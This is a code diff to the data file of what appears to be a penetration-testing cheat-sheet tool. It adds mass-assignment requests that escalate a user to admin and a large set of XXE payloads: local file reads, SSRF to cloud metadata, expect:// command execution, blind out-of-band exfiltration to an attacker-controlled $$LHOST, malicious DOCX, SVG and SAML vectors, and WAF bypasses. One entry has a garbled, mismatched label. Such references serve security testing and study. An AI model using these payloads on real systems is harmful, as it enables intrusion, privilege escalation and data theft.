+            { id: "idor-m1", label: "Add unlisted fields to request", os: "Both", command: "# Registration request:\nPOST /api/register\n{\"email\":\"x@x.com\",\"password\":\"pass\",\"role\":\"admin\",\"isAdmin\":true,\"verified\":true}", notes: "Add any fields found in GET responses to POST/PUT bodies. Frameworks often auto-bind all." },
+            { id: "idor-m2", label: "Discover bindable fields (GET)", os: "Both", command: "# GET profile to see all model fields:\nGET /api/user/me → {\"id\":1,\"email\":\"...\",\"role\":\"user\",\"isAdmin\":false,\"credits\":100}", notes: "Fields shown in GET responses are often bindable in POST/PUT. Try setting each to privileged value." },
+            { id: "idor-m3", label: "Update hidden fields", os: "Both", command: "PUT /api/user/$$USER_ID\n{\"email\":\"x@x.com\",\"balance\":99999,\"role\":\"admin\"}", notes: "Profile update endpoints are the most common mass assignment vector — not just registration." },
             ]
           }
         ],
@@ -2152,17 +2495,39 @@ const TACTICS = [
             id: "xxe-read",
             name: "File Read & SSRF",
             commands: [
-            { id: "xxe1", label: "Basic file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "Replace existing XML body in Burp with this payload." },
-            { id: "xxe2", label: "Windows file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>", notes: "" },
-            { id: "xxe3", label: "XXE to SSRF", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>", notes: "Combine with SSRF targets to reach internal services." }
+            { id: "xxe1", label: "Basic file read (Linux)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "Replace existing XML body in Burp with this payload." },
+            { id: "xxe2", label: "Windows file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>", notes: "Also try: file:///c:/inetpub/wwwroot/web.config" },
+            { id: "xxe3", label: "XXE to SSRF", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>", notes: "Combine with SSRF targets: 169.254.169.254 (AWS metadata), internal services via http://." },
+            { id: "xxe-r1", label: "PHP source via expect://', os: 'Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"expect://id\">\n]>\n<root>&xxe;</root>", notes: "expect:// executes system commands. Rarely enabled but worth trying." },
+            { id: "xxe-r2", label: "PHP source via php://filter", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "php:// wrappers work in XXE if PHP stream wrappers are allowed by the parser." },
             ]
           },
           {
             id: "xxe-blind",
-            name: "Blind & SVG",
+            name: "Blind OOB Exfiltration",
             commands: [
-            { id: "xxe4", label: "Blind XXE (OOB exfil)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST/evil.dtd\">\n  %dtd;\n]>\n<root>&send;</root>\n\n# evil.dtd (serve with python3 -m http.server 80):\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrap \"<!ENTITY send SYSTEM 'http://$$LHOST/?x=%file;'>\">\n%wrap;", notes: "" },
-            { id: "xxe5", label: "XXE in SVG upload", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>", notes: "Upload as .svg if the app renders SVG images server-side." }
+            { id: "xxe4", label: "Blind XXE (parameter entity)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST/evil.dtd\">\n  %dtd;\n]>\n<root>&send;</root>\n\n# evil.dtd (serve with python3 -m http.server 80):\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrap \"<!ENTITY send SYSTEM 'http://$$LHOST/?x=%file;'>\">\n%wrap;", notes: "Two-stage OOB: load external DTD, which defines an entity that exfils file content via HTTP." },
+            { id: "xxe-b1", label: "Blind XXE via DNS", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST.oast.fun/\">\n  %dtd;\n]>\n<root></root>", notes: "Confirms blind XXE via DNS/HTTP callback. Use Burp Collaborator or interactsh." },
+            { id: "xxe-b2", label: "Error-based XXE", os: "Both", command: "# evil.dtd:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % err \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%err;\n%error;", notes: "File content appears in the error message — no OOB connection required." },
+            ]
+          },
+          {
+            id: "xxe-svg",
+            name: "SVG & Alternative Vectors",
+            commands: [
+            { id: "xxe5", label: "XXE in SVG upload", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>", notes: "Upload as .svg if the app renders SVG images server-side. Also try docx/xlsx which are XML zips." },
+            { id: "xxe-sv1", label: "DOCX/XLSX (Office XML)", os: "Linux", command: "# Unzip docx:\nunzip -d docx original.docx\n# Edit word/document.xml — inject entity at top:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n# Reference &xxe; inside body text\n# Repack:\ncd docx && zip -r ../evil.docx .", notes: "Office files are ZIP archives of XML. If app parses docx server-side → XXE possible." },
+            { id: "xxe-sv2", label: "SAML-based XXE", os: "Both", command: "# Intercept SAML assertion in Burp:\n# Base64 decode → inject XXE entity into XML\n# Re-encode and replay", notes: "SAML assertions are XML and often parsed with external entity support enabled. High impact if found." },
+            ]
+          },
+          {
+            id: "xxe-bypass",
+            name: "Filter Bypass",
+            commands: [
+            { id: "xxe-fb1", label: "Encoding bypass", os: "Both", command: "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "UTF-16 encoding bypasses WAFs that search for DOCTYPE keyword in UTF-8." },
+            { id: "xxe-fb2", label: "DOCTYPE in attribute", os: "Both", command: "<?xml version=\"1.0\"?>\n<root attr=\"&xxe;\"><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]></root>", notes: "Reorder elements — some parsers accept DOCTYPE after the root element." },
+            { id: "xxe-fb3", label: "XInclude (no DOCTYPE needed)", os: "Both", command: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</foo>", notes: "XInclude doesn't need DOCTYPE. Works when you can only control part of the XML body." },
+            { id: "xxe-fb4", label: "Nested entity bypass", os: "Both", command: "<!ENTITY % a \"<!ENTITY b SYSTEM 'file:///etc/passwd'>\">\n%a;\n&b;", notes: "Some parsers reject direct nested entities but allow parameterized expansion." },
             ]
           }
         ],
